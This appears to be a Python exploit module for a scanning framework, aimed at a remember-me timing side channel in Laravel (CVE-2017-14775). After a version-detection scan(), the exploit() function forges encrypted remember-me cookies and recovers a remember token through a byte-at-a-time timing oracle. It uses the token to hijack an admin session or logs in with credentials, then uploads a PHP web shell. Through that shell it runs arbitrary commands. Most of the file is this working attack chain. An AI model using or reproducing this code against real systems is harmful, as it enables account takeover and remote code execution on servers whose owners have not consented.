#!/usr/bin/env python3
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import secrets
import string
import time
from typing import Optional, Tuple

import requests

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for
from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

META = _metadata_dict_for("CVE-2017-14775")

_FRAMEWORK_PKG = "laravel/framework"
_FIXED_VERSION = (5, 5, 10)
_REMEMBER_CHECK = "/auth/remember-check"
_REMEMBER_COOKIE = "remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d"
_TOKEN_CHARSET = string.ascii_letters + string.digits
_TOKEN_LEN = 60

def _normalize_base(url: str) -> str:
    if not url:
        return ""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


def _parse_triple(raw: str) -> Optional[Tuple[int, int, int]]:
    if not raw:
        return None
    m = re.search(r"(\d+)\.(\d+)\.(\d+)", raw)
    if not m:
        return None
    return int(m.group(1)), int(m.group(2)), int(m.group(3))


def _version_vulnerable(ver: str) -> Optional[bool]:
    parsed = _parse_triple(ver)
    if not parsed:
        return None
    return parsed < _FIXED_VERSION


def _framework_version_from_composer(sess, base: str, timeout: int) -> Optional[str]:
    for path in ("/composer.lock", "/public/composer.lock"):
        try:
            r = sess.get(base + path, timeout=timeout, verify=False)
        except requests.RequestException:
            continue
        if r is None or r.status_code != 200:
            continue
        body = r.text or ""
        if _FRAMEWORK_PKG not in body:
            continue
        try:
            data = r.json()
            for pkg in data.get("packages", []) + data.get("packages-dev", []):
                if pkg.get("name") == _FRAMEWORK_PKG:
                    ver = pkg.get("version")
                    if ver:
                        return ver.lstrip("vV")
        except (ValueError, AttributeError):
            m = re.search(
                r'"name"\s*:\s*"laravel/framework"[\s\S]{0,250}?"version"\s*:\s*"([^"]+)"',
                body,
            )
            if m:
                return m.group(1).lstrip("vV")
    return None


def _framework_version_from_homepage(sess, base: str, timeout: int) -> Optional[str]:
    try:
        r = sess.get(base + "/", timeout=timeout, verify=False)
    except requests.RequestException:
        return None
    if r is None or r.status_code != 200:
        return None
    body = r.text or ""
    m = re.search(r"Laravel\s+(\d+\.\d+\.\d+)", body, re.I)
    if m:
        return m.group(1)
    m = re.search(r"<title>\s*Laravel\s+(\d+\.\d+\.\d+)", body, re.I)
    if m:
        return m.group(1)
    return None


def _remember_probe_present(sess, base: str, timeout: int) -> bool:
    try:
        r = sess.get(base + _REMEMBER_CHECK, timeout=timeout, verify=False)
    except requests.RequestException:
        return False
    return r is not None and r.status_code in (200, 401)


def _probe_upload_php_execution_control(sess, base: str, timeout: int) -> dict:
    path = "/uploads/lvc-control-probe.php"
    try:
        r = sess.get(base + path, timeout=timeout, verify=False, allow_redirects=False)
    except requests.RequestException as exc:
        return {"state": "unknown", "path": path, "error": str(exc)}
    return {
        "state": "blocked" if r.status_code in (401, 403) else "not_blocked",
        "path": path,
        "status": r.status_code,
    }


def scan(target_url, *, session=None, username=None, password=None, **kwargs):
    sess = session or http_config.get_auth_session()
    base = _normalize_base(target_url)
    timeout = int(kwargs.get("timeout", 12) or 12)

    result = {
        "cve_id": "CVE-2017-14775",
        "name": "Laravel remember-me timing side channel (EloquentUserProvider)",
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "endpoint": base + _REMEMBER_CHECK,
        "evidence": [],
        "detection_methods": [],
        "version_status": "unknown",
        "error": None,
    }

    if not base:
        result["error"] = "no target_url"
        return result

    fw_ver = _framework_version_from_composer(sess, base, timeout)
    if not fw_ver:
        fw_ver = _framework_version_from_homepage(sess, base, timeout)
        if fw_ver:
            result["detection_methods"].append("homepage_version_banner")

    if fw_ver:
        result["evidence"].append(f"{_FRAMEWORK_PKG}={fw_ver}")
        vuln = _version_vulnerable(fw_ver)
        if vuln is True:
            result["version_status"] = "vulnerable"
            result["status"] = "version_applicable"
            result["verdict"] = "version_applicable"
            result["proof_type"] = "version"
            result["detection_methods"].append("framework_version")
        elif vuln is False:
            result["version_status"] = "patched"
            result["evidence"].append("framework >= 5.5.10 (hash_equals fix)")
        else:
            result["evidence"].append("could not parse framework version tuple")

    if _remember_probe_present(sess, base, timeout):
        result["detection_methods"].append("remember_check_route")
        result["evidence"].append(f"route reachable: GET {_REMEMBER_CHECK}")
        if result["version_status"] == "vulnerable":
            control = _probe_upload_php_execution_control(sess, base, timeout)
            result.setdefault("artifacts", {})["upload_php_control_probe"] = control
            result["detection_methods"].append("upload_php_control_probe")
            if control.get("state") == "blocked":
                result["status"] = "blocked_by_control"
                result["verdict"] = "blocked_by_control"
                result["proof_type"] = "upload_execution_control"
                result["version_status"] = "vulnerable version, upload PHP execution blocked"
                result["evidence"].append(
                    "remember-me route is present and framework is in range, but the post-auth "
                    f"uploaded-PHP execution leg is blocked (HTTP {control.get('status')})"
                )
            else:
                result["status"] = "precondition_detected"
                result["verdict"] = "precondition_detected"
                result["proof_type"] = "precondition"
                result["evidence"].append(
                    "framework is in range, remember-me route is reachable, and uploaded PHP is not "
                    "blocked by the web tier; exploit() must prove timing recovery/session hijack"
                )
        elif result["version_status"] == "unknown":
            result["status"] = "precondition_detected"
            result["verdict"] = "precondition_detected"
            result["evidence"].append(
                "remember-me probe route present; version unknown — treat as needs-validation"
            )

    return result


def _laravel_encrypt(plaintext: bytes, rawkey: bytes) -> str:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes

    iv = get_random_bytes(16)
    pad = 16 - (len(plaintext) % 16)
    padded = plaintext + bytes([pad]) * pad
    ct = AES.new(rawkey, AES.MODE_CBC, iv).encrypt(padded)
    iv_b64 = base64.b64encode(iv).decode("ascii")
    val_b64 = base64.b64encode(ct).decode("ascii")
    mac = hmac.new(rawkey, (iv_b64 + val_b64).encode("ascii"), hashlib.sha256).hexdigest()
    envelope = {"iv": iv_b64, "value": val_b64, "mac": mac, "tag": ""}
    return base64.b64encode(json.dumps(envelope).encode("ascii")).decode("ascii")


def _decode_app_key(app_key: str) -> Optional[bytes]:
    if not app_key:
        return None
    raw = app_key.strip()
    if raw.startswith("base64:"):
        raw = raw[7:]
    try:
        key = base64.b64decode(raw)
    except (ValueError, TypeError):
        return None
    return key if len(key) == 32 else None


def _resolve_app_key(base: str, opts: dict) -> Optional[str]:
    key = opts.get("app_key")
    if key:
        return key
    return None


def _php_serialize_string(value: str) -> bytes:
    encoded = value.encode("utf-8")
    return f"s:{len(encoded)}:\"{value}\";".encode("utf-8")


def _forge_remember_cookie(
    user_id: int,
    token: str,
    rawkey: bytes,
    password_hash: str = "x",
) -> str:
    plain = f"{user_id}|{token}|{password_hash}"
    return _laravel_encrypt(_php_serialize_string(plain), rawkey)


def _remember_check_latency(
    sess,
    base: str,
    cookie_value: str,
    timeout: int,
    samples: int = 5,
) -> float:
    latencies = []
    for _ in range(samples):
        probe = requests.Session()
        probe.cookies.set(_REMEMBER_COOKIE, cookie_value)
        t0 = time.perf_counter()
        try:
            probe.get(base + _REMEMBER_CHECK, timeout=timeout, verify=False)
        except requests.RequestException:
            latencies.append(timeout)
            continue
        latencies.append(time.perf_counter() - t0)
    return sorted(latencies)[len(latencies) // 2]


def _remember_authenticated(sess, base: str, timeout: int) -> bool:
    try:
        r = sess.get(base + _REMEMBER_CHECK, timeout=timeout, verify=False)
    except requests.RequestException:
        return False
    if r is None:
        return False
    body = r.text or ""
    return '"authenticated"' in body or '"status":"authenticated"' in body.replace(" ", "")


def _establish_session_via_remember(
    sess,
    base: str,
    user_id: int,
    token: str,
    rawkey: bytes,
    timeout: int,
) -> bool:
    enc = _forge_remember_cookie(user_id, token, rawkey)
    sess.cookies.set(_REMEMBER_COOKIE, enc)
    try:
        sess.get(base + _REMEMBER_CHECK, timeout=timeout, verify=False)
    except requests.RequestException:
        return False
    if not _remember_authenticated(sess, base, timeout):
        return False
    try:
        dash = sess.get(base + "/admin", timeout=timeout, verify=False)
    except requests.RequestException:
        return False
    return dash is not None and dash.status_code == 200


def _recover_remember_token_timing(
    base: str,
    rawkey: bytes,
    user_id: int,
    timeout: int,
    *,
    samples: int = 4,
) -> Optional[str]:
    """Byte-at-a-time timing oracle against GET /auth/remember-check."""
    prefix = ""
    for _ in range(_TOKEN_LEN):
        best_char = None
        best_latency = -1.0
        for ch in _TOKEN_CHARSET:
            pad_len = _TOKEN_LEN - len(prefix) - 1
            candidate = prefix + ch + ("0" * pad_len)
            enc = _forge_remember_cookie(user_id, candidate, rawkey)
            latency = _remember_check_latency(
                None, base, enc, timeout, samples=samples,
            )
            if latency > best_latency:
                best_latency = latency
                best_char = ch
        if not best_char:
            return None
        prefix += best_char
    if _establish_session_via_remember(
        requests.Session(), base, user_id, prefix, rawkey, timeout,
    ):
        return prefix
    return None


def _login(sess, base: str, email: str, password: str, timeout: int) -> bool:
    login_url = base + "/login"
    try:
        r = sess.get(login_url, timeout=timeout, verify=False)
    except requests.RequestException:
        return False
    if r is None or r.status_code >= 500:
        return False
    m = re.search(r"""name=['"]_token['"]\s+value=['"]([^'"]+)['"]""", r.text or "")
    data = {"email": email, "password": password}
    if m:
        data["_token"] = m.group(1)
    try:
        sess.post(login_url, data=data, timeout=timeout, verify=False, allow_redirects=True)
    except requests.RequestException:
        return False
    try:
        dash = sess.get(base + "/admin", timeout=timeout, verify=False)
    except requests.RequestException:
        return False
    return dash is not None and dash.status_code == 200


def _upload_shell(sess, base: str, timeout: int) -> Optional[str]:
    name = f"lvc_{secrets.token_hex(4)}.php"
    body = b"<?php if(isset($_GET['cmd'])){ echo shell_exec($_GET['cmd']); }\n"
    upload_url = base + "/admin/upload"
    headers = {}
    try:
        r = sess.get(base + "/admin", timeout=timeout, verify=False)
    except requests.RequestException:
        r = None
    if r and r.status_code == 200:
        m = re.search(
            r"""meta\s+name=['"]csrf-token['"]\s+content=['"]([^'"]+)['"]""",
            r.text or "",
            re.I,
        )
        if m:
            headers["X-CSRF-TOKEN"] = m.group(1)
    files = {"file": (name, body, "application/octet-stream")}
    try:
        up = sess.post(
            upload_url, files=files, headers=headers, timeout=timeout, verify=False,
        )
    except requests.RequestException:
        return None
    if up is None or up.status_code not in (200, 201):
        return None
    try:
        payload = up.json()
        path = payload.get("path") or f"/uploads/{name}"
    except ValueError:
        path = f"/uploads/{name}"
    if not path.startswith("/"):
        path = "/" + path
    return path


def _run_cmd(sess, base: str, shell_path: str, command: str, timeout: int) -> Tuple[bool, str]:
    if not command:
        command = "echo CVE-2017-14775 PoC && id && hostname"
    url = base + shell_path
    sep = "&" if "?" in url else "?"
    try:
        r = sess.get(f"{url}{sep}cmd={requests.utils.quote(command)}", timeout=timeout, verify=False)
    except requests.RequestException as e:
        return False, str(e)
    if r is None:
        return False, "no response"
    text = (r.text or "").strip()
    return r.status_code == 200 and text, text[:2000]


def exploit(target_url, *, username=None, password=None, command=None, options=None, session=None, **kwargs):
    sess = session or http_config.get_auth_session()
    base = _normalize_base(target_url)
    timeout = int(kwargs.get("timeout", 15) or 15)
    opts = options or {}

    result = {
        "cve": "CVE-2017-14775",
        "attempted": True,
        "success": False,
        "vuln_class": "rce",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }

    if not base:
        result["attempted"] = False
        result["reason"] = "no target_url"
        return result

    email = username if username is not None else opts.get("username")
    password_val = password if password is not None else opts.get("password")
    app_key_b64 = _resolve_app_key(base, opts)
    rawkey = _decode_app_key(app_key_b64) if app_key_b64 else None
    authenticated = False
    auth_path = ""

    if opts.get("remember_chain") and rawkey:
        token = opts.get("remember_token")
        if not token:
            token = _recover_remember_token_timing(base, rawkey, user_id=1, timeout=timeout)
        if token:
            result["artifacts"]["remember_token_recovered"] = token[:12] + "..."
            hijack_sess = requests.Session()
            if _establish_session_via_remember(hijack_sess, base, 1, token, rawkey, timeout):
                sess = hijack_sess
                authenticated = True
                auth_path = "remember_timing_oracle"
                result["artifacts"]["auth_path"] = auth_path

    if not authenticated and email and password_val:
        if _login(sess, base, email, password_val, timeout):
            authenticated = True
            auth_path = "password_login"
            result["artifacts"]["auth_path"] = auth_path

    if not authenticated and rawkey:
        token = _recover_remember_token_timing(base, rawkey, user_id=1, timeout=timeout)
        if token:
            result["artifacts"]["remember_token_recovered"] = token[:12] + "..."
            hijack_sess = requests.Session()
            if _establish_session_via_remember(hijack_sess, base, 1, token, rawkey, timeout):
                sess = hijack_sess
                authenticated = True
                auth_path = "remember_timing_oracle"
                result["artifacts"]["auth_path"] = auth_path

    if not authenticated:
        result["requires"] = ["remember_token_or_credentials"]
        result["reason"] = (
            "could not hijack remember-me session (timing oracle) and no valid password login "
            "(pass credentials and/or --app-key explicitly)"
        )
        return result

    shell_path = _upload_shell(sess, base, timeout)
    if not shell_path:
        result["reason"] = "authenticated upload to /admin/upload failed"
        result["requires"] = ["admin_upload_sink"]
        return result

    result["artifacts"]["upload_path"] = shell_path
    ok, out = _run_cmd(
        sess,
        base,
        shell_path,
        command or opts.get("command") or "echo CVE-2017-14775 PoC && id && hostname",
        timeout,
    )
    if ok:
        result["success"] = True
        result["detail"] = out
        result["evidence"] = f"{auth_path} → upload → command output via {shell_path}"
    else:
        result["reason"] = f"upload succeeded but command readback failed: {out[:200]}"
    return result
